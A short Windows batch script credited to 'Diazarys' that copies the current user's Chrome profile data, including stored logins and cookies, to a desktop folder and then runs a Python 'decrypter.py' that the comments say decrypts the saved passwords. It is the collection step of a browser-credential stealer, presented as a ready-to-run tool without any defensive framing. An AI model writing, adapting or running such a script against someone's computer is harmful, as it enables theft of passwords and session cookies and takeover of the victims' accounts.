@echo off

rem Define the source directory
set "source=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default"

rem Define the destination directory on the desktop
set "destination=%USERPROFILE%\Desktop\Resolucion"

rem Check if the destination folder already exists, and if not, create it
if not exist "%destination%" (
    mkdir "%destination%"
)

rem Copy Chrome data to the destination folder
robocopy "%source%" "%destination%" /J /COPYALL /R:0 /W:0

rem Change to the desktop directory
cd "%USERPROFILE%\Desktop"

rem Run the Python script "decrypter.py" to decrypt passwords
rem Assuming that the Python script is named "decrypter.py"
python decrypter.py

rem Pause to allow you to see any output messages
pause

rem Credits to Diazarys